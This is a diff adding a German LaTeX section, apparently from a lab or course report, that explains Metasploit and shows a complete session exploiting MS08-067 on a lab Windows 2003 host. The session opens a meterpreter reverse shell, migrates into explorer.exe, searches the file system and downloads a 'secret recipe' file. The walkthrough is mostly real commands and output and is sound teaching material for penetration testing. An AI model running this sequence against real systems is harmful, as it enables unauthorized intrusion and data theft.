@@ -67,7 +67,294 @@ Rezept1NR.txt  testdatei.txt
 
 \subsubsection{Metasploit}
 
+Das Metasploit-Projekt ist ein freies Open-Source-Projekt zur
+Computersicherheit, das Informationen über Sicherheitslücken bietet und bei
+Penetrationstests sowie der Entwicklung von IDS-Signaturen(? @TODO) eingesetzt
+werden kann. Das bekannteste Teilprojekt ist das Metasploit Framework, ein
+Werkzeug zur Entwicklung und Ausführung von Exploits\footnote{Ein Exploit dient
+  dem Eindringen in ein Zielsystem, indem ein Programmfehler ausgenutzt wird.}
+gegen verteilte Zielrechner. Andere wichtige Teilprojekte sind das
+Shellcode-Archiv\footnote{Payload (Nutzlast) bezeichnet den Code, der auf dem
+  Zielrechner bei einem erfolgreichen Einbruch ausgeführt werden soll. Meist ist
+  dies Shellcode, der dem Angreifer ermöglicht auf eine Shell zuzugreifen. Es
+  könnte aber auch ein Meterpreter oder VNC-Server ausgeführt werden.} und
+Forschung im Bereich der IT-Sicherheit.
 
-\begin{lstlisting}
+\subsubsection{Benutzung von Metasploit}
 
+Nachdem die Metasploitkonsole über den Befehl \lstinline{./msfconsole} gestartet
+wurde, begrüßt sie den Benutzer mit den Anzahlen der bekannten
+Sicherheitslücken, Payloads etc.:
+\begin{lstlisting}[language=Metasploit]
+[*] Please wait while the Metasploit Pro Console initializes...
+
+[*] Starting Metasploit Console...
+       =[ metasploit v3.4.0-release [core:3.4 api:1.0]
+
++-- --=[ 840 exploits - 495 auxiliary - 146 post
+
++-- --=[ 250 payloads - 27 encoders - 8 nops
+\end{lstlisting}
+
+Metasploit wird angewiesen den gewünschten Exploit zu laden und anschließend mit
+den nötigen Optionen konfiguriert:
+\begin{lstlisting}[language=Metasploit]
+msf > use exploit/windows/smb/ms08_067_netapi
+msf  exploit(ms08_067_netapi) > set RHOST 172.16.14.40
+
+RHOST => 172.16.14.40
+
+msf  exploit(ms08_067_netapi) > set LHOST 172.16.20.17
+
+LHOST => 172.16.20.17
+
+msf  exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+PAYLOAD => windows/meterpreter/reverse_tcp
+\end{lstlisting}
+
+
+Die vorgenommenen Einstellungen werden überprüft:
+\begin{lstlisting}[language=Metasploit]
+msf  exploit(ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    172.16.14.40     yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
+   LHOST     172.16.20.17     yes       The listen address
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+\end{lstlisting}
+
+Der Exploit wird gestartet:
+\begin{lstlisting}[language=Metasploit]
+msf  exploit(ms08_067_netapi) >
+msf  exploit(ms08_067_netapi) > exploit
+
+[*] Started reverse handler on 172.16.14.40:4444
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows 2003 - No Service Pack - lang:Unknown
+[*] Selected Target: Windows 2003 SP0 Universal
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (752128 bytes) to 172.16.14.40
+[*] Meterpreter session 1 opened (172.16.20.17:4444 -> 172.16.14.40:1028)
+
+at 2012-07-07 11:30:14 +0200
+\end{lstlisting}
+
+Wir waren erfolgreich, und sind jetzt auf dem Zielsystem. Anschließend wurde
+noch nach laufenden Prozessen auf dem Zielsystem gesucht. Uns interessierte der
+Prozess 1696 (explorer.exe):
+\begin{lstlisting}[language=Metasploit]
+meterpreter > ps
+
+Process list
+============
+ PID   Name              Arch  Session  User  Path                                                                                
+ ---   ----              ----  -------  ----  ----                                                                            
+
+ 0     [System Process]
+
+ 4     System            x86   0        $U$NTAUTORITT\SYSTEM-0x4e542d4155544f524954c4545c53595354454d
+.
+.
+.
+
+ 1488  dfssvc.exe        x86   0        $U$NTAUTORITT\SYSTEM-0x4e542d4155544f524954c4545c53595354454d                          C:\WINDOWS\system32\Dfssvc.exe
+
+ 1696  explorer.exe      x86   0        TEST-174JNJRAFI\Administrator                                                          C:\WINDOWS\Explorer.EXE
+
+.
+.
+.
+ 2012  cmd.exe           x86   0        TEST-174JNJRAFI\Administrator                                                          C:\WINDOWS\system32\cmd.exe
+\end{lstlisting}
+
+Wir migrierten zum Prozess 1696:
+\begin{lstlisting}[language=Metasploit]
+meterpreter > migrate 1696
+
+[*] Migrating to 1696...
+
+[*] Migration completed successfully.
+
+meterpreter > ?
+
+Core Commands
+=============
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    
+.
+.
+.
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+\end{lstlisting}
+
+Nun können wir nach dem Rezept suchen:
+\begin{lstlisting}[language=Metasploit]
+Listing: C:\
+
+============
+Mode              Size        Type  Last modified              Name
+----              ----        ----  -------------              ----
+100777/rwxrwxrwx  0           fil   2012-06-16 13:45:23 +0200  AUTOEXEC.BAT
+100666/rw-rw-rw-  0           fil   2012-06-16 13:45:23 +0200  CONFIG.SYS
+40777/rwxrwxrwx   0           dir   2012-06-27 21:22:05 +0200  Dokumente und Einstellungen
+40777/rwxrwxrwx   0           dir   2012-06-17 22:48:54 +0200  Geheimrezepte
+100444/r--r--r--  0           fil   2012-06-16 13:45:23 +0200  IO.SYS
+100444/r--r--r--  0           fil   2012-06-16 13:45:23 +0200  MSDOS.SYS
+100555/r-xr-xr-x  47548       fil   2003-03-26 14:00:00 +0100  NTDETECT.COM
+40777/rwxrwxrwx   0           dir   2012-06-20 10:39:49 +0200  OpenSSL-Win32
+40555/r-xr-xr-x   0           dir   2012-07-02 22:38:16 +0200  Programme
+40777/rwxrwxrwx   0           dir   2012-06-16 13:49:13 +0200  RECYCLER
+40777/rwxrwxrwx   0           dir   2012-07-04 19:50:51 +0200  System Volume Information
+40777/rwxrwxrwx   0           dir   2012-06-16 18:07:44 +0200  WINDOWS
+100666/rw-rw-rw-  190         fil   2012-06-16 13:42:44 +0200  boot.ini
+100444/r--r--r--  4952        fil   2003-03-26 14:00:00 +0100  bootfont.bin
+100666/rw-rw-rw-  224045      fil   2012-07-02 11:09:57 +0200  events.txt
+100666/rw-rw-rw-  1610612736  fil   2012-07-04 19:50:50 +0200  pagefile.sys
+40777/rwxrwxrwx   0           dir   2012-07-01 00:55:54 +0200  public
+40777/rwxrwxrwx   0           dir   2012-06-16 13:45:30 +0200  wmpub
+
+meterpreter > cd "Dokumente und Einstellungen"
+meterpreter > ls
+
+Listing: C:\Dokumente und Einstellungen
+
+=======================================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2012-06-27 21:22:05 +0200  .
+40777/rwxrwxrwx  0     dir   1980-01-01 00:00:00 +0100  ..
+40777/rwxrwxrwx  0     dir   2012-06-17 22:53:43 +0200  Administrator
+40777/rwxrwxrwx  0     dir   2012-06-16 13:44:56 +0200  All Users
+40777/rwxrwxrwx  0     dir   2012-07-03 18:35:16 +0200  Christian
+40777/rwxrwxrwx  0     dir   2012-06-16 13:45:24 +0200  Default User
+40777/rwxrwxrwx  0     dir   2012-06-16 13:47:01 +0200  LocalService
+40777/rwxrwxrwx  0     dir   2012-06-27 11:59:54 +0200  Marcel
+40777/rwxrwxrwx  0     dir   2012-06-16 13:47:00 +0200  NetworkService
+40777/rwxrwxrwx  0     dir   2012-07-03 21:11:16 +0200  Rene
+40777/rwxrwxrwx  0     dir   2012-06-26 11:07:38 +0200  User0815
+
+meterpreter > cd User0815
+meterpreter > ls
+
+Listing: C:\Dokumente und Einstellungen\User0815
+
+================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40555/r-xr-xr-x   0       dir   2012-06-16 14:34:19 +0200  $U$Startmen-0x53746172746d656efc
+40777/rwxrwxrwx   0       dir   2012-06-26 11:07:38 +0200  .
+40777/rwxrwxrwx   0       dir   2012-06-27 21:22:05 +0200  ..
+40555/r-xr-xr-x   0       dir   2012-06-26 11:07:38 +0200  Anwendungsdaten
+40777/rwxrwxrwx   0       dir   2012-06-16 13:45:16 +0200  Cookies
+40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Desktop
+40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Druckumgebung
+40555/r-xr-xr-x   0       dir   2012-06-26 11:07:39 +0200  Eigene Dateien
+40555/r-xr-xr-x   0       dir   2012-06-26 11:07:45 +0200  Favoriten
+40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Lokale Einstellungen
+100666/rw-rw-rw-  524288  fil   2012-06-28 01:32:07 +0200  NTUSER.DAT
+40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Netzwerkumgebung
+40555/r-xr-xr-x   0       dir   2012-06-27 12:15:35 +0200  Recent
+40555/r-xr-xr-x   0       dir   2012-06-26 11:07:38 +0200  SendTo
+100666/rw-rw-rw-  0       fil   2012-06-16 14:34:53 +0200  Sti_Trace.log
+40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Vorlagen
+100666/rw-rw-rw-  1024    fil   2012-06-28 01:32:07 +0200  ntuser.dat.LOG
+100666/rw-rw-rw-  192     fil   2012-06-28 01:32:07 +0200  ntuser.ini
+
+meterpreter > cd Desktop
+meterpreter > ls
+
+Listing: C:\Dokumente und Einstellungen\User0815\Desktop
+
+========================================================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2012-06-16 14:34:19 +0200  .
+40777/rwxrwxrwx  0     dir   2012-06-26 11:07:38 +0200  ..
+
+meterpreter > cd ..
+meterpreter > cd Recent
+meterpreter > ls
+
+Listing: C:\Dokumente und Einstellungen\User0815\Recent
+
+=======================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40555/r-xr-xr-x   0     dir   2012-06-27 12:15:35 +0200  .
+40777/rwxrwxrwx   0     dir   2012-06-26 11:07:38 +0200  ..
+100666/rw-rw-rw-  150   fil   2012-06-26 11:07:39 +0200  Desktop.ini
+100666/rw-rw-rw-  408   fil   2012-06-26 11:13:40 +0200  Geheimrezepte.lnk
+100666/rw-rw-rw-  511   fil   2012-06-26 12:21:09 +0200  Rezept1NR.lnk
+100666/rw-rw-rw-  562   fil   2012-06-26 11:13:40 +0200  Rezept2NJ.lnk
+100666/rw-rw-rw-  511   fil   2012-06-26 11:14:01 +0200  Testdatei.lnk
+100666/rw-rw-rw-  392   fil   2012-06-27 12:15:35 +0200  WINDOWS.lnk
+100666/rw-rw-rw-  529   fil   2012-06-27 12:15:34 +0200  netfxocm.lnk
+100666/rw-rw-rw-  371   fil   2012-06-26 12:21:09 +0200  public.lnk
+
+meterpreter > search Geheimrezepte
+
+[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
+
+meterpreter > search -f Rezept*
+
+Found 6 results...
+
+    c:\\Dokumente und Einstellungen\Administrator\Recent\Rezept1NR.txt.lnk (552 bytes)
+    c:\\Dokumente und Einstellungen\Marcel\Recent\Rezept1NR.txt.lnk (552 bytes)
+    c:\\Dokumente und Einstellungen\User0815\Recent\Rezept1NR.lnk (511 bytes)
+    c:\\Dokumente und Einstellungen\User0815\Recent\Rezept2NJ.lnk (562 bytes)
+    c:\\Geheimrezepte\Rezept2NJ.txt (745 bytes)
+    c:\\public\Rezept1NR.txt (801 bytes)
+
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd Geheimrezepte
+meterpreter > ls
+
+Listing: C:\Geheimrezepte
+=========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2012-06-17 22:48:54 +0200  .
+40777/rwxrwxrwx   0     dir   1980-01-01 00:00:00 +0100  ..
+100666/rw-rw-rw-  745   fil   2012-06-17 22:47:47 +0200  Rezept2NJ.txt
+
+meterpreter > download Rezept2NJ.txt
+
+[*] downloading: Rezept2NJ.txt -> Rezept2NJ.txt
+[*] downloaded : Rezept2NJ.txt -> Rezept2NJ.txt
+
+meterpreter > ;-)
 \end{lstlisting}
